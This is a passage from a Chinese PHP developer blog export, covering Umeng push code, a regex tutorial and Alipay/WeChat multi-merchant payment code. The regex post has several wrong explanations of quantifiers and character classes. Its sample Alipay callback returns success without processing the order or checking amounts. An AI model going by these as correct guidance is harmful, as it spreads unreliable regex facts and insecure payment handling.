class="variable">$device_token</span>.<span class="string">','</span>;  </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">rtrim(<span class="variable">$data</span>[<span class="string">'ios_device_tokens'</span>] ,<span class="string">','</span>);</span><br><span class="line">rtrim(<span class="variable">$data</span>[<span class="string">'android_device_tokens'</span>] ,<span class="string">','</span>);</span><br><span class="line">**/</span><br><span class="line">//Android设备 </span><br><span class="line"><span class="variable">$config</span> = array(</span><br><span class="line">  <span class="string">'appkey'</span>=&gt;config(<span class="string">'umeng.androidKey'</span>),  </span><br><span class="line">  <span class="string">'appMasterSecret'</span>=&gt;config(<span class="string">'umeng.androidMasterSecret'</span>),  </span><br><span class="line">);</span><br><span class="line">// 导入友盟</span><br><span class="line"><span class="variable">$umeng</span> = new Umeng(<span class="variable">$config</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$umeng</span>-&gt;sendAndroidUnicast(<span class="variable">$DeviceTokens</span>[<span class="string">'android_device_tokens'</span>],<span class="variable">$title</span>,<span class="variable">$custom</span>);</span><br><span class="line">//iOS设备 </span><br><span class="line"><span class="variable">$config</span> = array(</span><br><span class="line">  <span class="string">'appkey'</span>=&gt;config(<span class="string">'umeng.iosKey'</span>),  </span><br><span class="line">  <span class="string">'appMasterSecret'</span>=&gt;config(<span class="string">'umeng.iosMasterSecret'</span>),  </span><br><span class="line">);</span><br><span class="line">// 导入友盟</span><br><span class="line"><span class="variable">$umeng</span> = new Umeng(<span class="variable">$config</span>);</span><br><span class="line"><span class="variable">$resultIOS</span> = <span class="variable">$umeng</span>-&gt;sendIOSUnicast(<span class="variable">$DeviceTokens</span>[<span class="string">'ios_device_tokens'</span>],<span class="variable">$title</span>,<span class="variable">$custom</span>);</span><br><span class="line">进行下一步处理</span><br><span class="line">  &#125; catch (Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="built_in">return</span> array(<span class="string">'code'</span>=&gt;<span class="string">'1001'</span>,<span class="string">'msg'</span>=&gt;<span class="variable">$e</span>-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就这么多，比较简单吧，后续业务复杂点在改进</p>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 友盟 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>正则解说</title>
      <link href="/php-regex.html"/>
      <url>/php-regex.html</url>
      <content type="html"><![CDATA[<h3 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h3><p>想必很多人都对正则表达式都头疼.今天,我以我的认识,加上网上一些文章,希望用常人都可以理解的表达方式.来和大家分享学习经验.</p><p>开篇,还是得说说 ^ 和 $ 他们是分别用来匹配字符串的开始和结束，以下分别举例说明 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"^The"</span>: 开头一定要有<span class="string">"The"</span>字符串; </span><br><span class="line"><span class="string">"of despair$"</span>: 结尾一定要有<span class="string">"of despair"</span> 的字符串;</span><br></pre></td></tr></table></figure><p>那么,<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"^abc$"</span>: 就是要求以abc开头和以abc结尾的字符串，实际上是只有abc匹配 </span><br><span class="line"><span class="string">"notice"</span>: 匹配包含notice的字符串</span><br></pre></td></tr></table></figure></p><p>你可以看见如果你没有用我们提到的两个字符（最后一个例子），就是说 模式（正则表达式） 可以出现在被检验字符串的任何地方，你没有把他锁定到两边 </p><p>接着,说说 ‘*’, ‘+’,和 ‘?’,<br>他们用来表示一个字符可以出现的次数或者顺序. 他们分别表示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"zero or more"</span>相当于&#123;0,&#125;, </span><br><span class="line"><span class="string">"one or more"</span>相当于&#123;1,&#125;, </span><br><span class="line"><span class="string">"zero or one."</span>相当于&#123;0,1&#125;, 这里是一些例子:</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"ab*"</span>: 和ab&#123;0,&#125;同义,匹配以a开头,后面可以接0个或者N个b组成的字符串(<span class="string">"a"</span>, <span class="string">"ab"</span>, <span class="string">"abbb"</span>, 等); </span><br><span class="line"><span class="string">"ab+"</span>: 和ab&#123;1,&#125;同义,同上条一样，但最少要有一个b存在 (<span class="string">"ab"</span>, <span class="string">"abbb"</span>, 等.); </span><br><span class="line"><span class="string">"ab?"</span>:和ab&#123;0,1&#125;同义,可以没有或者只有一个b; </span><br><span class="line"><span class="string">"a?b+$"</span>: 匹配以一个或者0个a再加上一个以上的b结尾的字符串.</span><br></pre></td></tr></table></figure><p>要点, ‘*’, ‘+’,和 ‘?’只管它前面那个字符.<br>你也可以在大括号里面限制字符出现的个数，比如<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"ab&#123;2&#125;"</span>: 要求a后面一定要跟两个b（一个也不能少）(<span class="string">"abb"</span>); </span><br><span class="line"><span class="string">"ab&#123;2,&#125;"</span>: 要求a后面一定要有两个或者两个以上b(如<span class="string">"abb"</span>, <span class="string">"abbbb"</span>, 等.); </span><br><span class="line"><span class="string">"ab&#123;3,5&#125;"</span>: 要求a后面可以有2－5个b(<span class="string">"abbb"</span>, <span class="string">"abbbb"</span>, or <span class="string">"abbbbb"</span>).</span><br></pre></td></tr></table></figure></p><p>现在我们把一定几个字符放到小括号里，比如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"a(bc)*"</span>: 匹配 a 后面跟0个或者一个<span class="string">"bc"</span>; </span><br><span class="line"><span class="string">"a(bc)&#123;1,5&#125;"</span>: 一个到5个 <span class="string">"bc."</span></span><br></pre></td></tr></table></figure></p><p>还有一个字符 ‘│’, 相当于OR 操作:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"hi│hello"</span>: 匹配含有<span class="string">"hi"</span> 或者 <span class="string">"hello"</span> 的 字符串; </span><br><span class="line"><span class="string">"(b│cd)ef"</span>: 匹配含有 <span class="string">"bef"</span> 或者 <span class="string">"cdef"</span>的字符串; </span><br><span class="line"><span class="string">"(a│b)*c"</span>: 匹配含有这样多个（包括0个）a或b，后面跟一个c 的字符串;</span><br></pre></td></tr></table></figure></p><p>一个点(‘.’)可以代表所有的单一字符,不包括”\n”</p><p>如果,要匹配包括”\n”在内的所有单个字符,怎么办?</p><p>对了,用’[\n.]’这种模式.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"a.[0-9]"</span>: 一个a加一个字符再加一个0到9的数字 </span><br><span class="line"><span class="string">"^.&#123;3&#125;$"</span>: 三个任意字符结尾 .</span><br></pre></td></tr></table></figure></p><p>中括号括住的内容只匹配一个单一的字符<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"[ab]"</span>: 匹配单个的 a 或者 b ( 和 <span class="string">"a│b"</span> 一样); </span><br><span class="line"><span class="string">"[a-d]"</span>: 匹配<span class="string">'a'</span> 到<span class="string">'d'</span>的单个字符 (和<span class="string">"a│b│c│d"</span> 还有 <span class="string">"[abcd]"</span>效果一样); 一般我们都用[a-zA-Z]来指定字符为一个大小写英文</span><br><span class="line"><span class="string">"^[a-zA-Z]"</span>: 匹配以大小写字母开头的字符串 </span><br><span class="line"><span class="string">"[0-9]%"</span>: 匹配含有 形如 x％ 的字符串 </span><br><span class="line"><span class="string">",[a-zA-Z0-9]$"</span>: 匹配以逗号再加一个数字或字母结尾的字符串</span><br></pre></td></tr></table></figure></p><p>你也可以把你不想要得字符列在中括号里，你只需要在总括号里面使用’^’ 作为开头 “%[^a-zA-Z]%” 匹配含有两个百分号里面有一个非字母的字符串. </p><p>要点:^用在中括号开头的时候,就表示排除括号里的字符 </p><p>为了PHP能够解释，你必须在这些字符面前后加’’,并且将一些字符转义. </p><p>不要忘记在中括号里面的字符是这条规路的例外?在中括号里面, 所有的特殊字符，包括(‘’), 都将失去他们的特殊性质 “[*+?{}.]”匹配含有这些字符的字符串.</p><p>还有,正如regx的手册告诉我们: “如果列表里含有 ‘]’, 最好把它作为列表里的第一个字符(可能跟在’^’后面). 如果含有’-‘, 最好把它放在最前面或者最后面, or 或者一个范围的第二个结束点[a-d-0-9]中间的‘-’将有效. </p><p>看了上面的例子,你对{n,m}应该理解了吧.要注意的是,n和m都不能为负整数,而且n总是小于m. 这样,才能 最少匹配n次且最多匹配m次. 如”p{1,5}”将匹配 “pvpppppp”中的前五个p</p><p>下面说说以\开头的</p><p>\b 书上说他是用来匹配一个单词边界,就是…比如’ve\b’,可以匹配love里的ve而不匹配very里有ve</p><p>\B 正好和上面的\b相反.例子我就不举了</p><p>…..突然想起来….可以到<a href="https://hiven09.github.io/2017/02/18/%E7%94%A8%20hexo%20%E5%88%9B%E5%BB%BA%20blog/">https://hiven09.github.io/2017/02/18/%E7%94%A8%20hexo%20%E5%88%9B%E5%BB%BA%20blog/</a> 看看其它用\ 开头的语法</p><p>好,我们来做个应用:</p><p>如何构建一个模式来匹配 货币数量 的输入 </p><p>构建一个匹配模式去检查输入的信息是否为一个表示money的数字。我们认为一个表示money的数量有四种方式： “10000.00” 和 “10,000.00”,或者没有小数部分, “10000” and “10,000”. 现在让我们开始构建这个匹配模式:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[1-9][0-9]*$</span><br></pre></td></tr></table></figure></p><p>这是所变量必须以非0的数字开头.但这也意味着 单一的 “0” 也不能通过测试. 以下是解决的方法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(0│[1-9][0-9]*)$</span><br></pre></td></tr></table></figure></p><p>“只有0和不以0开头的数字与之匹配”，我们也可以允许一个负号在数字之前:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(0│-?[1-9][0-9]*)$</span><br></pre></td></tr></table></figure></p><p>这就是: “0 或者 一个以0开头 且可能 有一个负号在前面的数字.” 好了,现在让我们别那么严谨，允许以0开头.现在让我们放弃 负号 , 因为我们在表示钱币的时候并不需要用到. 我们现在指定 模式 用来匹配小数部分:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[0-9]+(\.[0-9]+)?$</span><br></pre></td></tr></table></figure></p><p>这暗示匹配的字符串必须最少以一个阿拉伯数字开头. 但是注意，在上面模式中 “10.” 是不匹配的, 只有 “10” 和 “10.2” 才可以. （你知道为什么吗）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[0-9]+(\.[0-9]&#123;2&#125;)?$</span><br></pre></td></tr></table></figure></p><p>我们上面指定小数点后面必须有两位小数.如果你认为这样太苛刻,你可以改成:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[0-9]+(\.[0-9]&#123;1,2&#125;)?$</span><br></pre></td></tr></table></figure></p><p>这将允许小数点后面有一到两个字符. 现在我们加上用来增加可读性的逗号（每隔三位）, 我们可以这样表示:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*(\.[0-9]&#123;1,2&#125;)?$ [page]</span><br></pre></td></tr></table></figure></p><p>不要忘记 ‘+’ 可以被 ‘*’ 替代 如果你想允许空白字符串被输入话 (为什么?). 也不要忘记反斜杆 ’\’ 在php字符串中可能会出现错误 (很普遍的错误). </p><p>现在，我们已经可以确认字符串了, 我们现在把所有逗号都去掉 str_replace(“,”, “”, $money) 然后在把类型看成 double然后我们就可以通过他做数学计算了. </p><p>再来一个:</p><p>构造检查email的正则表达式 </p><p>在一个完整的email地址中有三个部分: </p><ol><li>用户名 (在 ‘@’ 左边的一切),<br>2.‘@’,</li><li>服务器名(就是剩下那部分). </li></ol><p>用户名可以含有大小写字母阿拉伯数字,句号 (‘.’), 减号(‘-‘), and 下划线 (‘_’). 服务器名字也是符合这个规则,当然下划线除外. </p><p>现在, 用户名的开始和结束都不能是句点. 服务器也是这样. 还有你不能有两个连续的句点他们之间至少存在一个字符，好现在我们来看一下怎么为用户名写一个匹配模式:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[_a-zA-Z0-9-]+$</span><br></pre></td></tr></table></figure></p><p>现在还不能允许句号的存在. 我们把它加上:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*$</span><br></pre></td></tr></table></figure></p><p>上面的意思就是说: “以至少一个规范字符（除了.）开头,后面跟着0个或者多个以点开始的字符串.” </p><p>简单化一点, 我们可以用 eregi()取代 ereg().eregi()对大小写不敏感, 我们就不需要指定两个范围 “a-z” 和 “A-Z” ? 只需要指定一个就可以了:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[_a-z0-9-]+(\.[_a-z0-9-]+)*$</span><br></pre></td></tr></table></figure></p><p>后面的服务器名字也是一样,但要去掉下划线:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[a-z0-9-]+(\.[a-z0-9-]+)*$</span><br></pre></td></tr></table></figure></p><p>好. 现在只需要用”@”把两部分连接:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*$</span><br></pre></td></tr></table></figure></p><p>这就是完整的email认证匹配模式了,只需要调用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eregi(‘^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*$ ’,<span class="variable">$eamil</span>)</span><br></pre></td></tr></table></figure></p><p>就可以得到是否为email了<br>正则表达式的其他用法 </p><p>提取字符串 </p><p>ereg() and eregi() 有一个特性是允许用户通过正则表达式去提取字符串的一部分(具体用法你可以阅读手册). 比如说,我们想从 path/URL 提取文件名 ? 下面的代码就是你需要:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ereg(<span class="string">"([^\\/]*)$"</span>, <span class="variable">$pathOrUrl</span>, <span class="variable">$regs</span>); </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$regs</span>[1];</span><br></pre></td></tr></table></figure></p><p>高级的代换 </p><p>ereg_replace() 和 eregi_replace()也是非常有用的: 假如我们想把所有的间隔负号都替换成逗号: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ereg_replace(<span class="string">"[ \n\r\t]+"</span>, <span class="string">","</span>, trim(<span class="variable">$str</span>));</span><br></pre></td></tr></table></figure><p>最后,我把另一串检查EMAIL的正则表达式让看文章的你来分析一下.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"^[-!#$%&amp;\'*+\\./0-9=?A-Z^_`a-z&#123;|&#125;~]+'.'@'.'[-!#$%&amp;\'*+\\/0-9=?A-Z^_`a-z&#123;|&#125;~]+\.'.'[-!#$%&amp;\'*+\\./0-9=?A-Z^_`a-z&#123;|&#125;~]+$"</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php支付宝多账号支付</title>
      <link href="/php-wechat.html"/>
      <url>/php-wechat.html</url>
      <content type="html"><![CDATA[<h2 id="支付宝进行app支付"><a href="#支付宝进行app支付" class="headerlink" title="支付宝进行app支付"></a>支付宝进行app支付</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>支付宝支付的官方<a href="https://docs.open.alipay.com/54/106370/" target="_blank" rel="noopener">服务端demo</a></p><p>项目背景，多个商家在同一个平台支付，根据商家号去查询商家的appid(支付宝分配给开发者的应用ID)<br>支付宝的应用公钥和私钥以及通过应用公钥生成的支付宝公钥可以多个商家公用一个(方便，给个赞)</p><p>商户生成签名字符串所使用的签名算法类型，目前支持RSA2和RSA，推荐使用RSA2</p><p>支付宝审核效率较快</p><ul><li>首先说一下服务商版，可以到这里看看介绍 <a href="https://pay.weixin.qq.com/service_provider/index.shtml" target="_blank" rel="noopener">https://pay.weixin.qq.com/service_provider/index.shtml</a></li></ul><p>服务商版的微信支付开发文档在这里 <a href="https://pay.weixin.qq.com/wiki/doc/api/sl.html" target="_blank" rel="noopener">https://pay.weixin.qq.com/wiki/doc/api/sl.html</a></p><p>这里主要说一下从原来的普通的账号转变为接入服务商要做哪些改变</p><p>这是第一个注意的地方<br>以刷卡支付为例，可以对比看到，多了两个参数sub_appid,sub_mch_id，这两个参数填你原来账号的。<br>而appid,mch_id填服务商的，服务商会给你的</p><p>如果是微信公众账号内h5支付<br>要求传openid和sub_openid,这里只传sub_openid即可，内容填以前获取的openid，不变</p><p>另外，再提醒下，微信app支付比较特殊，它的appid和其它的支付使用的appid是不相同的<br>微信app支付的appid去open.weixin.qq.com查看<br>而其它的支付的appid去mp.weixin.qq.com查看</p><p>加密(重点)<br>加密使用商户给的key，自己以前的key已经无效了。</p><p>支付目录<br>开通商户后，商户会叫你提供appid和支付目录，这时自己设置的支付目录已经无效。<br>注意区分正式目录和测试目录，若使用测试目录，必须要把个人微信号填入白名单切必须要在微信公众账号里打开支付链接。</p><p>话不多说，开始</p><h3 id="支付宝支付请求"><a href="#支付宝支付请求" class="headerlink" title="支付宝支付请求"></a>支付宝支付请求</h3><p>支付宝支付都是json格式</p><h4 id="起调"><a href="#起调" class="headerlink" title="起调"></a>起调</h4><ul><li>支付宝支付起调</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">alipay_app</span></span>()&#123;</span><br><span class="line">//构造业务请求参数的集合(订单信息)</span><br><span class="line"><span class="variable">$content</span> = array();</span><br><span class="line"><span class="variable">$content</span>[<span class="string">'subject'</span>] = <span class="variable">$this</span>-&gt;subject;//商品的标题/交易标题/订单标题/订单关键字等</span><br><span class="line"><span class="variable">$content</span>[<span class="string">'out_trade_no'</span>] = <span class="variable">$this</span>-&gt;out_trade_no;//商户网站唯一订单号</span><br><span class="line"><span class="variable">$content</span>[<span class="string">'timeout_express'</span>] = <span class="variable">$this</span>-&gt;timeout_express;//商品的标题/交易标题/订单标题/订单关键字等</span><br><span class="line"><span class="variable">$content</span>[<span class="string">'total_amount'</span>] = floatval(<span class="variable">$this</span>-&gt;total_amount);//订单总金额(必须定义成浮点型)</span><br><span class="line"><span class="variable">$content</span>[<span class="string">'product_code'</span>] = <span class="variable">$this</span>-&gt;product_code;//销售产品码，商家和支付宝签约的产品码，为固定值QUICK_MSECURITY_PAY</span><br><span class="line"><span class="variable">$con</span> = json_encode(<span class="variable">$content</span>);//<span class="variable">$content</span>是biz_content的值,将之转化成字符串</span><br><span class="line">//构造公共参数</span><br><span class="line"><span class="built_in">unset</span>(<span class="variable">$parameter</span>);</span><br><span class="line"><span class="variable">$parameter</span> = array(</span><br><span class="line"><span class="string">"app_id"</span> =&gt; <span class="variable">$this</span>-&gt;app_id,//支付宝分配给开发者的应用ID</span><br><span class="line"><span class="string">"method"</span> =&gt; <span class="variable">$this</span>-&gt;method,//接口名称</span><br><span class="line"><span class="string">"charset"</span> =&gt; <span class="variable">$this</span>-&gt;charset,//请求使用的编码格式</span><br><span class="line"><span class="string">"sign_type"</span> =&gt; <span class="variable">$this</span>-&gt;sign_type,//商户生成签名字符串所使用的签名算法类型</span><br><span class="line"><span class="string">"timestamp"</span>  =&gt; date(<span class="string">"Y-m-d H:i:s"</span>),//发送请求的时间</span><br><span class="line"><span class="string">"version"</span>=&gt; <span class="variable">$this</span>-&gt;version,//调用的接口版本，固定为：1.0</span><br><span class="line"><span class="string">"notify_url"</span>  =&gt; <span class="variable">$this</span>-&gt;notify_url,//支付宝服务器主动通知地址</span><br><span class="line"><span class="string">"biz_content"</span>  =&gt; <span class="variable">$con</span>,//业务请求参数的集合,长度不限,json格式</span><br><span class="line">);</span><br><span class="line">//生成签名</span><br><span class="line"><span class="variable">$Client</span> = new AopClient();</span><br><span class="line"><span class="variable">$paramStr</span> = <span class="variable">$Client</span>-&gt;getSignContent(<span class="variable">$parameter</span>);//签名字符串</span><br><span class="line"><span class="variable">$sign</span> = <span class="variable">$Client</span>-&gt;alonersaSign(<span class="variable">$paramStr</span>,<span class="variable">$this</span>-&gt;rsaPrivateKey,<span class="variable">$this</span>-&gt;sign_type);</span><br><span class="line"><span class="variable">$parameter</span>[<span class="string">'sign'</span>] = <span class="variable">$sign</span>;</span><br><span class="line">writeLog(<span class="string">"| APP支付 | 参数 | "</span>.json_encode(<span class="variable">$parameter</span>), config(<span class="string">'PAY_LOG'</span>),<span class="string">'alipay'</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$Client</span>-&gt;getSignContentUrlencode(<span class="variable">$parameter</span>);</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h4><ul><li>支付宝支付回调</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">notifyPay</span></span>()&#123;</span><br><span class="line">//验证生成签名</span><br><span class="line"><span class="variable">$Client</span> = new AopClient(<span class="variable">$this</span>-&gt;alipayrsaPublicKey);</span><br><span class="line"><span class="variable">$verify_result</span> = <span class="variable">$Client</span>-&gt;rsaCheckV1(<span class="variable">$_POST</span>,null);</span><br><span class="line">writeLog(<span class="string">"| 支付回调 | 数据验证 | "</span>.json_encode(<span class="variable">$verify_result</span>),config(<span class="string">'PAY_LOG'</span>),<span class="string">'alipay'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$verify_result</span>) &#123;//验证成功</span><br><span class="line">/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">//请在这里加上商户的业务逻辑程序代</span><br><span class="line">//——请根据您的业务逻辑来编写程序（以下代码仅作参考）——</span><br><span class="line">//获取支付宝的通知返回参数，可参考技术文档中服务器异步通知参数列表</span><br><span class="line">//商户订单号</span><br><span class="line"><span class="variable">$out_trade_no</span> = <span class="variable">$_POST</span>[<span class="string">'out_trade_no'</span>];</span><br><span class="line">//支付宝交易号</span><br><span class="line"><span class="variable">$trade_no</span> = <span class="variable">$_POST</span>[<span class="string">'trade_no'</span>];</span><br><span class="line">//交易状态</span><br><span class="line"><span class="variable">$trade_status</span> = <span class="variable">$_POST</span>[<span class="string">'trade_status'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">'trade_status'</span>] == <span class="string">'TRADE_FINISHED'</span>) &#123;</span><br><span class="line"><span class="built_in">return</span> <span class="string">'success'</span>;</span><br><span class="line">//判断该笔订单是否在商户网站中已经做过处理</span><br><span class="line">//如果没有做过处理，根据订单号（out_trade_no）在商户网站的订单系统中查到该笔订单的详细，并执行商户的业务程序</span><br><span class="line">//请务必判断请求时的total_fee、seller_id与通知时获取的total_fee、seller_id为一致的</span><br><span class="line">//如果有做过处理，不执行商户的业务程序</span><br><span class="line">//注意：</span><br><span class="line">//退款日期超过可退款期限后（如三个月可退款），支付宝系统发送该交易状态通知</span><br><span class="line">//调试用，写文本函数记录程序运行情况是否正常</span><br><span class="line">//logResult(<span class="string">"这里写入想要调试的代码变量值，或其他运行的结果记录"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">'trade_status'</span>] == <span class="string">'TRADE_SUCCESS'</span>) &#123;</span><br><span class="line"><span class="built_in">return</span> <span class="string">'success'</span>;</span><br><span class="line">//判断该笔订单是否在商户网站中已经做过处理</span><br><span class="line">//如果没有做过处理，根据订单号（out_trade_no）在商户网站的订单系统中查到该笔订单的详细，并执行商户的业务程序</span><br><span class="line">//请务必判断请求时的total_fee、seller_id与通知时获取的total_fee、seller_id为一致的</span><br><span class="line">//如果有做过处理，不执行商户的业务程序</span><br><span class="line">//注意：</span><br><span class="line">//付款完成后，支付宝系统发送该交易状态通知</span><br><span class="line">//调试用，写文本函数记录程序运行情况是否正常</span><br><span class="line">//logResult(<span class="string">"这里写入想要调试的代码变量值，或其他运行的结果记录"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">'trade_status'</span>] == <span class="string">'TRADE_CLOSED'</span>) &#123;</span><br><span class="line"><span class="built_in">return</span> <span class="string">'success'</span>;</span><br><span class="line">//判断该笔订单是否在商户网站中已经做过处理</span><br><span class="line">//如果没有做过处理，根据订单号（out_trade_no）在商户网站的订单系统中查到该笔订单的详细，并执行商户的业务程序</span><br><span class="line">//请务必判断请求时的total_fee、seller_id与通知时获取的total_fee、seller_id为一致的</span><br><span class="line">//如果有做过处理，不执行商户的业务程序</span><br><span class="line">//注意：</span><br><span class="line">//付款完成后，支付宝系统发送该交易状态通知</span><br><span class="line">//调试用，写文本函数记录程序运行情况是否正常</span><br><span class="line">//logResult(<span class="string">"这里写入想要调试的代码变量值，或其他运行的结果记录"</span>);</span><br><span class="line">&#125;</span><br><span class="line">//——请根据您的业务逻辑来编写程序（以上代码仅作参考）——</span><br><span class="line"><span class="built_in">return</span> <span class="string">'fail'</span>;</span><br><span class="line">//<span class="built_in">echo</span> <span class="string">"success"</span>; //请不要修改或删除</span><br><span class="line">/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">return</span> <span class="string">'fail'</span>;</span><br><span class="line">//验证失败</span><br><span class="line">// <span class="built_in">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">//调试用，写文本函数记录程序运行情况是否正常</span><br><span class="line">//logResult(<span class="string">"这里写入想要调试的代码变量值，或其他运行的结果记录"</span>);</span><br><span 